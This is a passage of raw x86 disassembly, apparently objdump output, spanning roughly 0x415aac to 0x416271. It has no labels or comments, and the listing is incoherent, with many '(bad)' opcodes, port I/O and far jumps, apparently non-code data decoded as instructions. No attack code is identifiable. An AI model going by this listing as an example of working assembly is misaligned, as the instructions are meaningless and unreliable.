  415aac:	js     0x415a89
  415aae:	xchg   ebx,eax
  415aaf:	loop   0x415abd
  415ab1:	add    BYTE PTR [edx],ah
  415ab3:	stos   DWORD PTR es:[edi],eax
  415ab4:	out    0x15,al
  415ab6:	lds    ecx,FWORD PTR [edx-0x16895d21]
  415abc:	fwait
  415abd:	add    BYTE PTR [edx+0x17bd1f1a],al
  415ac3:	lds    edx,FWORD PTR [ebx-0x5ecab93e]
  415ac9:	mov    bl,BYTE PTR [ebx]
  415acb:	ds dec edx
  415acd:	mov    esi,esp
  415acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ad0:	adc    DWORD PTR [edx+ecx*1+0x68],esp
  415ad4:	inc    esi
  415ad5:	lahf   
  415ad6:	push   ebx
  415ad7:	sub    eax,eax
  415ad9:	adc    ah,BYTE PTR [edx+0x2f9b7abd]
  415adf:	ja     0x415afc
  415ae1:	xor    ebx,DWORD PTR [ebx+esi*8-0x7afe7606]
  415ae8:	add    al,0x6b
  415aea:	sbb    eax,DWORD PTR [ebx+esi*2-0x12a19a15]
  415af1:	int    0x39
  415af3:	sbb    cl,BYTE PTR [eax-0x9b7dfe3]
  415af9:	pusha  
  415afa:	jno    0x415b7b
  415afc:	cmp    dl,al
  415afe:	rol    BYTE PTR [ecx],1
  415b00:	outs   dx,BYTE PTR ds:[esi]
  415b01:	ds dec esi
  415b03:	sbb    al,0x52
  415b05:	call   0x810c00d8
  415b0a:	test   eax,0x708205e6
  415b0f:	aaa    
  415b10:	jb     0x415adb
  415b12:	jmp    0xd5ee046b
  415b17:	pop    ecx
  415b18:	and    esi,esp
  415b1a:	cld    
  415b1b:	es and ecx,edi
  415b1e:	sub    al,0xaf
  415b20:	mov    ah,0x79
  415b22:	sbb    ch,BYTE PTR [esi]
  415b24:	jnp    0x415b2f
  415b26:	push   0x22
  415b28:	fidiv  DWORD PTR [ebp+0x4f]
  415b2b:	dec    edx
  415b2c:	lea    edi,[ecx+eiz*8-0x12]
  415b30:	push   0x6e
  415b32:	inc    eax
  415b33:	adc    al,BYTE PTR [edx]
  415b35:	fistp  WORD PTR [edi-0x5d45839a]
  415b3b:	xchg   ecx,eax
  415b3c:	xor    al,0x9
  415b3e:	and    eax,0x3de2c4d4
  415b43:	pop    ds
  415b44:	sbb    al,0x5e
  415b46:	popa   
  415b47:	icebp  
  415b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b49:	cdq    
  415b4a:	arpl   si,cx
  415b4c:	push   ebx
  415b4d:	mov    esp,0xb40cf316
  415b52:	push   ss
  415b53:	pop    ss
  415b54:	mov    ah,0x28
  415b56:	std    
  415b57:	out    0x7d,al
  415b59:	test   ah,bh
  415b5b:	xor    DWORD PTR [esi],0x3b
  415b5e:	jnp    0x415b58
  415b60:	and    DWORD PTR [edi+0x2e],ebp
  415b63:	std    
  415b64:	sbb    ebx,0x931d2bdf
  415b6a:	ss dec esi
  415b6c:	xchg   esp,eax
  415b6d:	mov    cl,0x16
  415b6f:	pop    esp
  415b70:	push   ss
  415b71:	or     al,0x8a
  415b73:	ss cld 
  415b75:	enter  0x73fa,0xd
  415b79:	(bad)  
  415b7a:	and    BYTE PTR [bp+si],cl
  415b7d:	ja     0x415b25
  415b7f:	ins    BYTE PTR es:[edi],dx
  415b80:	dec    edi
  415b81:	popf   
  415b82:	push   ss
  415b83:	cld    
  415b84:	sub    eax,0x7691f4db
  415b89:	out    dx,eax
  415b8a:	aas    
  415b8b:	mov    dl,0xc9
  415b8d:	adc    al,0x87
  415b8f:	das    
  415b90:	xor    edi,DWORD PTR [edx+0x3a7f8c4]
  415b96:	mov    ch,0x4
  415b98:	(bad)  
  415b99:	cli    
  415b9a:	jne    0x415bec
  415b9c:	and    dh,bl
  415b9e:	mov    esi,0x43bd6f1b
  415ba3:	dec    edx
  415ba4:	test   edi,edx
  415ba6:	mov    dl,0xcc
  415ba8:	jge    0x415c0b
  415baa:	aam    0x5e
  415bac:	push   ebp
  415bad:	and    al,0xc
  415baf:	pop    ecx
  415bb0:	jl     0x415bfd
  415bb2:	cwde   
  415bb3:	inc    edi
  415bb4:	and    al,0x94
  415bb6:	or     dl,BYTE PTR [edi+0x7779ec10]
  415bbc:	xchg   DWORD PTR [edi-0x20],ebp
  415bbf:	pop    esp
  415bc0:	xchg   edx,eax
  415bc1:	test   eax,0xdc4f453a
  415bc6:	sub    al,0x88
  415bc8:	sub    dh,BYTE PTR [ebx+0x79]
  415bcb:	sbb    bh,BYTE PTR [ebx]
  415bcd:	imul   esp,DWORD PTR [esp+esi*4-0x50],0xffffffbb
  415bd2:	js     0x415c01
  415bd4:	into   
  415bd5:	xlat   BYTE PTR ds:[ebx]
  415bd6:	imul   esp,DWORD PTR [ebx],0x6c
  415bd9:	loopne 0x415c45
  415bdb:	pop    ebx
  415bdc:	mov    ds:0xc48d965d,eax
  415be1:	addr16 hlt 
  415be3:	(bad)  [ebp+edx*4-0xa]
  415be7:	and    DWORD PTR [edx-0x2ea2c182],ecx
  415bed:	cmp    BYTE PTR [edi],ah
  415bef:	pusha  
  415bf0:	inc    esp
  415bf1:	je     0x415c5f
  415bf3:	pop    esi
  415bf4:	je     0x415b76
  415bf6:	xor    ah,dh
  415bf8:	test   eax,0x4478933c
  415bfd:	inc    esp
  415bfe:	sbb    al,0x64
  415c00:	fmul   QWORD PTR [edx]
  415c02:	push   ebp
  415c03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c04:	push   esi
  415c05:	retf   
  415c06:	ret    
  415c07:	mov    edi,0x84bbb0ac
  415c0c:	or     eax,0x80eb572b
  415c11:	ins    BYTE PTR es:[edi],dx
  415c12:	aad    0x7c
  415c14:	push   ecx
  415c15:	ror    DWORD PTR [edx+eax*2+0x62],cl
  415c19:	xor    ebp,DWORD PTR ds:0x2eb91727
  415c1f:	cdq    
  415c20:	sbb    ecx,DWORD PTR [edi-0x2c891a]
  415c26:	jle    0x415c02
  415c28:	cs pop esi
  415c2a:	mov    bh,0x8
  415c2c:	pushf  
  415c2d:	dec    edi
  415c2e:	test   al,0x50
  415c30:	ret    
  415c31:	loop   0x415c19
  415c33:	ret    
  415c34:	dec    ecx
  415c35:	icebp  
  415c36:	lods   al,BYTE PTR ds:[esi]
  415c37:	xor    BYTE PTR ds:0xb4f025a7,dl
  415c3d:	aam    0x4b
  415c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c40:	xchg   BYTE PTR [eax+0x2d7a9cbe],dl
  415c46:	mov    ?,WORD PTR [esi]
  415c48:	call   DWORD PTR ds:0x5f9dd5d3
  415c4e:	jle    0x415bd4
  415c50:	sbb    DWORD PTR [ebx+0x6f],edi
  415c53:	inc    esp
  415c54:	in     al,0x51
  415c56:	mov    dl,0xd
  415c58:	pop    ds
  415c59:	fadd   DWORD PTR [esi-0x1ea44910]
  415c5f:	add    bh,BYTE PTR [edi-0xa9b84c0]
  415c65:	stos   DWORD PTR es:[edi],eax
  415c66:	ja     0x415caf
  415c68:	cmp    al,0xc6
  415c6a:	push   esi
  415c6b:	push   edx
  415c6c:	aad    0xb1
  415c6e:	adc    al,0xb4
  415c70:	rcr    BYTE PTR [edi+0x483ec0c2],0xac
  415c77:	mov    edx,0xff9a9792
  415c7c:	push   0x7de0ec52
  415c81:	rcl    esp,0xe
  415c84:	das    
  415c85:	sbb    BYTE PTR ds:0x40963b1a,al
  415c8b:	xor    BYTE PTR [ecx-0x2efbdace],dl
  415c91:	cmp    al,0xe0
  415c93:	stos   DWORD PTR es:[edi],eax
  415c94:	sbb    DWORD PTR [esi],0xffffffc8
  415c97:	jae    0x415c31
  415c99:	sbb    eax,0xdfbae0be
  415c9e:	into   
  415c9f:	jbe    0x415c53
  415ca1:	or     DWORD PTR [edi-0x304eabf3],ebp
  415ca7:	add    BYTE PTR [ecx],dh
  415ca9:	mov    al,0x9a
  415cab:	scas   al,BYTE PTR es:[edi]
  415cac:	and    DWORD PTR [ebx],edi
  415cae:	stc    
  415caf:	push   ecx
  415cb0:	(bad)  
  415cb2:	sub    al,BYTE PTR [ecx+0x63]
  415cb5:	inc    ebx
  415cb6:	cmc    
  415cb7:	test   DWORD PTR [ebx],0x408888f9
  415cbd:	dec    edi
  415cbe:	cmc    
  415cbf:	add    DWORD PTR [eax-0x26],esp
  415cc2:	mov    ss,WORD PTR [edx]
  415cc4:	loope  0x415c86
  415cc6:	push   eax
  415cc7:	clc    
  415cc8:	xchg   ecx,eax
  415cc9:	mov    esp,0x8540652
  415cce:	xchg   esp,eax
  415ccf:	push   0xf1e29f49
  415cd4:	loopne 0x415c92
  415cd6:	ds (bad) 
  415cd8:	push   cs
  415cd9:	loopne 0x415cd2
  415cdb:	dec    esp
  415cdc:	cld    
  415cdd:	test   al,0xd2
  415cdf:	mov    eax,ds:0x79e9d762
  415ce4:	or     eax,0x2d423e7f
  415ce9:	push   ebp
  415cea:	xlat   BYTE PTR ds:[ebx]
  415ceb:	jae    0x7d251101
  415cf1:	je     0x415c7f
  415cf3:	sar    dh,0xa5
  415cf6:	cmp    ecx,DWORD PTR [ebp+ebx*8-0x241c9049]
  415cfd:	mov    edx,0x39a6b589
  415d02:	ja     0x415ca6
  415d04:	xor    al,0x9e
  415d06:	repnz and al,0x58
  415d09:	mov    al,ds:0xe6a55bd4
  415d0e:	sti    
  415d0f:	pop    ebp
  415d10:	fisubr DWORD PTR [edx+eax*4-0x37864d8d]
  415d17:	rcr    BYTE PTR [ecx+edx*4],cl
  415d1a:	jle    0x415d5f
  415d1c:	cld    
  415d1d:	fcmovnb st,st(4)
  415d1f:	cld    
  415d20:	test   eax,0x5be0412b
  415d25:	jmp    0x415caa
  415d27:	pop    ss
  415d28:	jle    0x415cab
  415d2a:	(bad)  
  415d2c:	jmp    0x6c92:0x4994d876
  415d33:	and    bh,0x64
  415d36:	mov    al,ds:0xebaf30c1
  415d3b:	popa   
  415d3c:	test   DWORD PTR [esi+eiz*2],0x113c6f4b
  415d43:	mov    WORD PTR [edx+0x58],es
  415d46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d47:	pushf  
  415d48:	fwait
  415d49:	(bad)  
  415d4a:	adc    BYTE PTR [eax],ah
  415d4c:	fnstenv [edx+0x60755361]
  415d52:	jbe    0x415d7a
  415d54:	mov    eax,0x2d320c8b
  415d59:	enter  0xbe66,0x42
  415d5d:	add    eax,0x11a4ae44
  415d62:	xchg   DWORD PTR [ebp-0x4],esi
  415d65:	(bad)  [ebp-0x15]
  415d68:	arpl   WORD PTR [esi+0x1b416714],di
  415d6e:	lods   eax,DWORD PTR ds:[esi]
  415d6f:	mov    eax,0x557eaf25
  415d74:	aas    
  415d75:	mov    edx,0x36f03f74
  415d7a:	ret    0x8b7c
  415d7d:	xor    eax,0x6555a26d
  415d82:	sub    ebp,edi
  415d84:	popf   
  415d85:	in     eax,dx
  415d86:	jle    0x415d44
  415d88:	add    BYTE PTR [ebp+0x10],al
  415d8b:	push   esi
  415d8c:	sbb    BYTE PTR [edi],0xe9
  415d8f:	inc    ecx
  415d90:	mov    ecx,0x41863472
  415d95:	imul   esp,ecx,0x8f9ed10a
  415d9b:	(bad)  
  415d9d:	mov    DWORD PTR [edx+edx*4],ebp
  415da0:	scas   al,BYTE PTR es:[edi]
  415da1:	adc    DWORD PTR [edi],0xffffffb1
  415da4:	xor    DWORD PTR ds:0xeb673d9e,esi
  415daa:	mov    ebp,gs
  415dac:	inc    eax
  415dad:	jns    0x415e08
  415daf:	in     eax,dx
  415db0:	jb     0x415dcf
  415db2:	jl     0x415da5
  415db4:	jns    0x415d75
  415db6:	fidivr DWORD PTR [edi-0x78379cca]
  415dbc:	xchg   edi,eax
  415dbd:	and    ebx,DWORD PTR [esi]
  415dbf:	xor    dl,BYTE PTR [edx]
  415dc1:	sti    
  415dc2:	fbstp  TBYTE PTR [esi]
  415dc4:	repnz dec esp
  415dc6:	xchg   ecx,eax
  415dc7:	cmp    al,BYTE PTR [edx]
  415dc9:	(bad)  
  415dca:	xor    edi,esp
  415dcc:	scas   al,BYTE PTR es:[edi]
  415dcd:	rcr    DWORD PTR [eax-0x37955f47],1
  415dd3:	xchg   ebp,eax
  415dd4:	or     al,0xb5
  415dd6:	pop    ebp
  415dd7:	cld    
  415dd8:	aaa    
  415dd9:	sbb    ebx,DWORD PTR [ecx+0x495ce3f0]
  415ddf:	nop
  415de0:	outs   dx,BYTE PTR ds:[esi]
  415de1:	icebp  
  415de2:	fistp  DWORD PTR [ebx]
  415de4:	mov    esp,0x8240d17c
  415de9:	adc    DWORD PTR [edi+0x51],edx
  415dec:	leave  
  415ded:	push   ds
  415dee:	gs gs dec esi
  415df1:	(bad)  
  415df2:	ja     0x415e4f
  415df4:	pop    edi
  415df5:	popf   
  415df6:	out    0x20,al
  415df8:	cmc    
  415df9:	aam    0xd6
  415dfb:	call   0x6c59e923
  415e00:	cmp    DWORD PTR [edx-0x6c],edx
  415e03:	xchg   edx,eax
  415e04:	push   es
  415e05:	dec    eax
  415e06:	out    dx,eax
  415e07:	fadd   QWORD PTR [eax]
  415e09:	jecxz  0x415d9e
  415e0b:	push   esp
  415e0c:	mov    DWORD PTR [ecx],eax
  415e0e:	inc    edx
  415e0f:	je     0x415dee
  415e11:	dec    ebx
  415e12:	es or  al,0x4a
  415e15:	mov    bl,0x8b
  415e17:	fcom   DWORD PTR [eax]
  415e19:	aam    0x69
  415e1b:	and    eax,0xe06a14fc
  415e20:	xchg   esp,eax
  415e21:	mov    ecx,0x90c861c8
  415e26:	xchg   esi,eax
  415e27:	add    bh,BYTE PTR [esi+0x32]
  415e2a:	inc    ebp
  415e2b:	lods   al,BYTE PTR ds:[esi]
  415e2c:	ja     0x415e63
  415e2e:	std    
  415e2f:	mov    ds:0x1287cac9,al
  415e34:	cmp    dl,dh
  415e36:	add    bh,cl
  415e38:	dec    edi
  415e39:	sub    dl,BYTE PTR [edx-0x18]
  415e3c:	jmp    0x2b35:0xf6245d2
  415e43:	rol    al,cl
  415e45:	in     al,dx
  415e46:	retf   0x41f3
  415e49:	sub    DWORD PTR [edi+ecx*1],ebx
  415e4c:	sbb    eax,0x85d16ed6
  415e51:	pushf  
  415e52:	retf   0xc2d7
  415e55:	scas   al,BYTE PTR es:[edi]
  415e56:	rol    BYTE PTR [esp+ebp*1-0x3269a3dc],1
  415e5d:	fisub  DWORD PTR [ecx-0x207566c5]
  415e63:	mov    dl,0xe0
  415e65:	imul   esp,DWORD PTR [edi-0x60],0x55c57bf9
  415e6c:	sub    ch,BYTE PTR [ebp+0x1bdbbe85]
  415e72:	lahf   
  415e73:	ret    
  415e74:	idiv   esi
  415e76:	stos   BYTE PTR es:[edi],al
  415e77:	ja     0x415ecf
  415e79:	sub    bl,BYTE PTR [esi]
  415e7b:	rcr    BYTE PTR [esi+0x65b5a523],1
  415e81:	in     al,dx
  415e82:	test   BYTE PTR [esi],0x0
  415e85:	add    ch,BYTE PTR [edi-0x7b247820]
  415e8b:	add    DWORD PTR ds:0x787d2794,ebx
  415e91:	push   0xffffff83
  415e93:	jmp    eax
  415e95:	imul   eax,eax,0xc3fbe080
  415e9b:	dec    eax
  415e9c:	lock gs pop esp
  415e9f:	jae    0x415e86
  415ea1:	test   eax,0x17b93232
  415ea6:	sbb    DWORD PTR [esi],edi
  415ea8:	cmp    dl,BYTE PTR [edx]
  415eaa:	mov    ch,0xc
  415eac:	sbb    ecx,ebx
  415eae:	sub    ah,BYTE PTR [esi]
  415eb0:	aam    0xb
  415eb2:	int3   
  415eb3:	les    ebx,FWORD PTR [edi-0x5746beae]
  415eb9:	retf   0x58aa
  415ebc:	dec    edi
  415ebd:	mov    cl,0x79
  415ebf:	jnp    0x415f3f
  415ec1:	jns    0x415e5d
  415ec3:	test   BYTE PTR [edi+0x5],dl
  415ec6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ec7:	dec    esi
  415ec8:	or     DWORD PTR [esi+0x2a219d2d],esp
  415ece:	mov    dh,0x9f
  415ed0:	push   esi
  415ed1:	cmp    bl,0xae
  415ed4:	cmp    esi,ecx
  415ed6:	sbb    al,0xf6
  415ed8:	adc    DWORD PTR [ecx-0x111384c0],edi
  415ede:	iret   
  415edf:	aad    0x5e
  415ee1:	jp     0x415ebf
  415ee3:	add    DWORD PTR [edx],0x4d
  415ee6:	rcl    BYTE PTR [ecx-0x4d],0xad
  415eea:	xor    bl,cl
  415eec:	xlat   BYTE PTR ds:[ebx]
  415eed:	cmp    DWORD PTR [ebx],ebx
  415eef:	push   ecx
  415ef1:	arpl   bx,ax
  415ef3:	jle    0x415e76
  415ef5:	mov    eax,0xa89b3de5
  415efa:	outs   dx,DWORD PTR ds:[esi]
  415efb:	jo     0x415f0d
  415efd:	add    DWORD PTR [edi],0xffffff8b
  415f00:	sbb    al,0x8d
  415f02:	push   eax
  415f03:	cmp    bl,BYTE PTR [eax-0x1fe1231e]
  415f09:	repz lds ebx,FWORD PTR ss:[ebx-0x15dd915c]
  415f11:	cwde   
  415f12:	xchg   DWORD PTR [ebp+0x11],esp
  415f15:	je     0x415f02
  415f17:	ficomp WORD PTR [ecx+0x28394674]
  415f1d:	ins    DWORD PTR es:[edi],dx
  415f1e:	push   ecx
  415f1f:	int3   
  415f20:	js     0x415f2f
  415f22:	fdiv   QWORD PTR [ecx+0x3c6fbd5]
  415f28:	inc    ebx
  415f29:	ds jno 0x415ef0
  415f2c:	pop    ebp
  415f2d:	sbb    DWORD PTR [ecx],ebp
  415f2f:	out    0x69,al
  415f31:	fs popa 
  415f33:	xchg   esi,eax
  415f34:	cmc    
  415f35:	xchg   esp,eax
  415f36:	cmp    DWORD PTR [ecx-0x410fd0d9],ebp
  415f3c:	lds    ecx,FWORD PTR [edx+0x4bb484ad]
  415f42:	in     al,0xa6
  415f44:	les    esi,FWORD PTR [edx-0x5335b175]
  415f4a:	cmp    al,0x41
  415f4c:	(bad)  
  415f4e:	retf   
  415f4f:	push   ss
  415f50:	or     al,0xed
  415f52:	jo     0x415f3a
  415f54:	jle    0x415f2f
  415f56:	icebp  
  415f57:	ret    0x6379
  415f5a:	lock into 
  415f5c:	sub    esi,DWORD PTR [esi+0x1c]
  415f5f:	sub    eax,0x2f8863ee
  415f64:	push   ebx
  415f65:	lods   al,BYTE PTR ds:[esi]
  415f66:	pushf  
  415f67:	repnz test eax,0x63f524b2
  415f6d:	int3   
  415f6e:	stos   BYTE PTR es:[edi],al
  415f6f:	mov    eax,ds:0xfa3f8f89
  415f74:	add    DWORD PTR [ebx-0x56],edx
  415f77:	mov    bh,0x12
  415f79:	pop    ecx
  415f7a:	adc    ebp,DWORD PTR ss:[edi]
  415f7d:	pop    ebx
  415f7e:	sub    ecx,DWORD PTR [edx]
  415f80:	add    DWORD PTR [ebx],ecx
  415f82:	cli    
  415f83:	std    
  415f84:	out    0x66,eax
  415f86:	mov    bh,0x1f
  415f88:	pop    ss
  415f89:	fld    st(0)
  415f8b:	clc    
  415f8c:	or     al,0xc2
  415f8e:	ret    0x450b
  415f91:	bound  ecx,QWORD PTR [edi-0x46]
  415f94:	cmp    eax,0xe6e6fa91
  415f99:	xor    eax,0x969cabe9
  415f9e:	in     al,0x48
  415fa0:	push   ecx
  415fa1:	ret    0x7dfb
  415fa4:	les    eax,FWORD PTR [ebx]
  415fa6:	shr    DWORD PTR [edx],cl
  415fa8:	or     al,0x5f
  415faa:	mov    edi,0x8d2dd175
  415faf:	sbb    al,0x70
  415fb1:	push   ds
  415fb2:	out    0x93,eax
  415fb4:	pop    ebx
  415fb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fb6:	loope  0x415ff8
  415fb8:	push   esi
  415fb9:	cs scas al,BYTE PTR es:[edi]
  415fbb:	and    BYTE PTR [ecx+0x18e95d99],cl
  415fc1:	aaa    
  415fc2:	imul   ebx,DWORD PTR [ecx-0x5cf28904],0xffffff83
  415fc9:	rcl    BYTE PTR [esi],0x97
  415fcc:	push   ebp
  415fcd:	mov    DWORD PTR [edx-0x6c094a1c],esp
  415fd3:	cmp    edx,DWORD PTR [ebp-0x7a]
  415fd6:	cld    
  415fd7:	fst    QWORD PTR [ecx+0x352cb4c5]
  415fdd:	cmp    eax,0x3a02b356
  415fe2:	stos   BYTE PTR es:[edi],al
  415fe3:	pop    ecx
  415fe4:	(bad)  [edi]
  415fe6:	(bad)  
  415fe7:	mov    bh,al
  415fe9:	mov    al,ds:0x27142214
  415fee:	xchg   edx,eax
  415fef:	xchg   ecx,eax
  415ff0:	fstp   DWORD PTR [ecx+eax*1+0x53fa0bff]
  415ff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ff8:	jno    0x415fc6
  415ffa:	sahf   
  415ffb:	sub    cl,dl
  415ffd:	cwde   
  415ffe:	mov    ch,0x2e
  416000:	xor    ecx,ecx
  416002:	(bad)  
  416003:	loop   0x415f88
  416005:	and    edx,DWORD PTR [ecx]
  416007:	pusha  
  416008:	inc    edi
  416009:	fst    DWORD PTR [edx+0x1f]
  41600c:	mov    edx,0xb7f74601
  416011:	cmp    al,BYTE PTR ds:0x43dd949b
  416017:	movd   mm3,DWORD PTR ds:0x7093f0b5
  41601e:	lods   al,BYTE PTR ds:[esi]
  41601f:	lods   eax,DWORD PTR ds:[esi]
  416020:	(bad)  
  416021:	scas   al,BYTE PTR es:[edi]
  416022:	jns    0x41605a
  416024:	pop    es
  416025:	ret    0x516
  416028:	cmp    al,0xea
  41602a:	and    al,0x77
  41602c:	(bad)  
  41602d:	in     eax,0x33
  41602f:	call   0x48a9:0x3e17a0d2
  416036:	inc    edi
  416037:	xchg   esi,eax
  416038:	add    esi,DWORD PTR [ecx]
  41603a:	es cwde 
  41603c:	jo     0x416048
  41603e:	mov    ds:0xf0e35246,eax
  416043:	mov    bh,0x7
  416045:	retf   0x90c8
  416048:	mov    ?,WORD PTR [eax-0x350f8de0]
  41604e:	mov    ebx,0x7a9242d9
  416053:	or     eax,0x85017809
  416058:	out    0x6d,eax
  41605a:	ss neg bl
  41605d:	pop    ebx
  41605e:	lahf   
  41605f:	jno    0x416093
  416061:	cld    
  416062:	xchg   esi,eax
  416063:	and    ecx,DWORD PTR [esi+0x706cb287]
  416069:	gs push ss
  41606b:	sbb    bl,dh
  41606d:	push   ds
  41606e:	mov    al,0xbc
  416070:	call   0xde8da9b4
  416075:	jp     0x416001
  416077:	cli    
  416078:	dec    edi
  416079:	inc    ebx
  41607a:	fmul   DWORD PTR [edi+eax*8+0x1b77fff6]
  416081:	aaa    
  416082:	mov    cl,0xc2
  416084:	sbb    edi,ecx
  416086:	aad    0xa
  416088:	pop    esi
  416089:	sti    
  41608a:	mov    bl,0xf6
  41608c:	shl    ah,1
  41608e:	sar    DWORD PTR [eax],cl
  416090:	adc    dh,BYTE PTR [ebp+0x3c20b495]
  416096:	pop    eax
  416097:	dec    DWORD PTR [edi+0xf]
  41609a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41609b:	imul   esi,DWORD PTR [ebx],0x23ad3146
  4160a1:	push   ebp
  4160a2:	adc    al,0xa9
  4160a4:	mov    dh,0x36
  4160a6:	or     al,BYTE PTR [edi-0x34f97d6e]
  4160ac:	sahf   
  4160ad:	push   esp
  4160ae:	sub    al,0x88
  4160b0:	mov    dl,dl
  4160b2:	or     BYTE PTR [edx],bl
  4160b4:	inc    BYTE PTR [edi]
  4160b6:	jns    0x416080
  4160b8:	push   ebx
  4160b9:	dec    edi
  4160ba:	push   eax
  4160bb:	jl     0x416093
  4160bd:	cdq    
  4160be:	cmp    ah,bl
  4160c0:	std    
  4160c1:	mov    eax,0xd818f377
  4160c6:	mov    BYTE PTR [edx+esi*1+0xabfcd],bh
  4160cd:	mov    BYTE PTR [ecx],al
  4160cf:	inc    esi
  4160d0:	push   0xffffff9e
  4160d2:	jl     0x416151
  4160d4:	dec    edx
  4160d5:	jbe    0x4160c4
  4160d7:	and    al,0xda
  4160d9:	out    dx,eax
  4160da:	jmp    0x4160ef
  4160dc:	retf   
  4160dd:	loop   0x416143
  4160df:	adc    BYTE PTR ds:0xab589b3d,al
  4160e5:	scas   eax,DWORD PTR es:[edi]
  4160e6:	shl    ebx,cl
  4160e8:	lock jle 0x416131
  4160eb:	test   al,0xbb
  4160ed:	ror    al,1
  4160ef:	cmp    al,0xdd
  4160f1:	xor    ah,ch
  4160f3:	jnp    0x4160f0
  4160f5:	test   ebx,0xae987d8a
  4160fb:	iret   
  4160fc:	dec    ebx
  4160fd:	fwait
  4160fe:	and    DWORD PTR [eax+ecx*2],ebp
  416101:	pusha  
  416102:	mov    cl,0xa2
  416104:	mov    ds:0x2b49a79d,eax
  416109:	push   ss
  41610a:	stos   BYTE PTR es:[edi],al
  41610b:	outs   dx,BYTE PTR ds:[esi]
  41610c:	arpl   dx,si
  41610e:	mov    bl,0x53
  416110:	sub    ch,BYTE PTR [ebx-0x12]
  416113:	stos   BYTE PTR es:[edi],al
  416114:	call   0x7544:0x820257ed
  41611b:	sahf   
  41611c:	sub    eax,0x110424f1
  416121:	pop    ebp
  416122:	add    BYTE PTR [edx+0x6c73606],dl
  416128:	loopne 0x416147
  41612a:	imul   eax
  41612c:	jmp    0xa836:0xe1ccc2ea
  416133:	push   es
  416134:	sub    eax,DWORD PTR [edx-0x1a47d806]
  41613a:	shl    DWORD PTR [ebx+0x3e5e571b],0x9d
  416141:	sbb    dh,ch
  416143:	cld    
  416144:	stos   DWORD PTR es:[edi],eax
  416145:	or     al,0x5b
  416147:	les    eax,FWORD PTR [esp+esi*2]
  41614a:	and    al,0x5
  41614c:	mov    ds:0x2881ebd6,al
  416151:	mov    ds:0x20478bec,eax
  416156:	repz cmp DWORD PTR gs:[ebx-0x5f],eax
  41615b:	xchg   ebx,ebp
  41615d:	into   
  41615e:	push   0x6b
  416160:	inc    eax
  416161:	xlat   BYTE PTR ds:[ebx]
  416162:	xchg   ebx,eax
  416163:	and    edx,DWORD PTR [edx-0x55]
  416166:	fdiv   DWORD PTR [eax]
  416168:	jb     0x416165
  41616a:	daa    
  41616b:	in     al,dx
  41616c:	test   DWORD PTR [ebx-0x4cfe209e],0x682610a5
  416176:	cmp    ebp,DWORD PTR [edi]
  416178:	mov    esi,0x30d0040c
  41617d:	not    BYTE PTR [eax]
  41617f:	push   0x23
  416181:	and    ah,BYTE PTR [edi+ebx*2-0x7bfb0b72]
  416188:	mov    dh,0xb5
  41618a:	sub    DWORD PTR [edi],ebx
  41618c:	pop    edi
  41618d:	sbb    BYTE PTR [esi],dh
  41618f:	imul   ebp,DWORD PTR [edi],0x52b8dac8
  416195:	sub    dh,BYTE PTR [ebx]
  416197:	sub    edx,DWORD PTR [ecx-0x24323c9e]
  41619d:	shr    DWORD PTR [esi+eiz*2],1
  4161a0:	adc    eax,0xae71d487
  4161a5:	cwde   
  4161a6:	and    eax,0x890b0874
  4161ab:	scas   al,BYTE PTR es:[edi]
  4161ac:	(bad)
  4161af:	sub    cl,BYTE PTR [ebx]
  4161b1:	pop    es
  4161b2:	xchg   ebx,eax
  4161b3:	adc    eax,0xbd4304f7
  4161b8:	inc    ebp
  4161b9:	into   
  4161ba:	cmp    BYTE PTR [esp+esi*2],al
  4161bd:	int3   
  4161be:	gs aam 0xd8
  4161c1:	dec    esi
  4161c2:	mov    DWORD PTR [edi-0x30be4f5a],edx
  4161c8:	jge    0x416161
  4161ca:	fld    QWORD PTR [ecx-0x2ec502c7]
  4161d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161d1:	inc    esi
  4161d2:	sub    eax,0x948ee8e4
  4161d7:	pop    edx
  4161d8:	rcl    DWORD PTR [edi],0x44
  4161db:	js     0x41624e
  4161dd:	leave  
  4161de:	add    al,0x97
  4161e0:	outs   dx,BYTE PTR ds:[esi]
  4161e1:	test   DWORD PTR ds:0xedd20db7,ecx
  4161e7:	dec    esp
  4161e8:	shr    DWORD PTR [edx+0x40],0xe3
  4161ec:	clc    
  4161ed:	dec    esi
  4161ee:	fiadd  WORD PTR [edx]
  4161f0:	sub    dh,BYTE PTR [esi-0x37]
  4161f3:	cmp    eax,DWORD PTR [ebx+edx*2-0x1be2bc7d]
  4161fa:	out    dx,al
  4161fb:	and    eax,0x1a9998b
  416200:	pop    ss
  416201:	stc    
  416202:	in     eax,0x6c
  416204:	repz dec ebp
  416206:	and    eax,0x6191c9a5
  41620b:	data16 jne 0x416234
  41620e:	xchg   esp,eax
  41620f:	sar    edi,1
  416211:	outs   dx,BYTE PTR ds:[esi]
  416212:	pop    ebp
  416213:	sbb    ah,0x4a
  416216:	dec    ecx
  416217:	enter  0x6d09,0x8f
  41621b:	and    eax,DWORD PTR ds:0x18798a5e
  416221:	(bad)  
  416223:	cdq    
  416224:	or     al,0xa7
  416226:	pop    ss
  416227:	xchg   ebp,eax
  416228:	sahf   
  416229:	test   DWORD PTR [ebx+0x22d58fe5],edi
  41622f:	test   eax,0x2b425938
  416234:	repz cdq 
  416236:	add    ebp,0x607df76f
  41623c:	or     BYTE PTR [ebx+edi*1],al
  41623f:	lock jp 0x4161cd
  416242:	jg     0x416270
  416244:	push   0xfffffff3
  416246:	sbb    al,0x6d
  416248:	sti    
  416249:	lods   eax,DWORD PTR ds:[esi]
  41624a:	or     ebp,0xf98220f0
  416250:	cwde   
  416251:	push   eax
  416252:	dec    eax
  416253:	imul   ebp,DWORD PTR [eax-0x43934e2b],0xae587243
  41625d:	call   0xeffe61d
  416262:	jmp    0x9eb2:0xe7a28a2
  416269:	imul   edi,DWORD PTR [ebx+eax*4],0xc9f02d58
  416270:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416271:	int3   
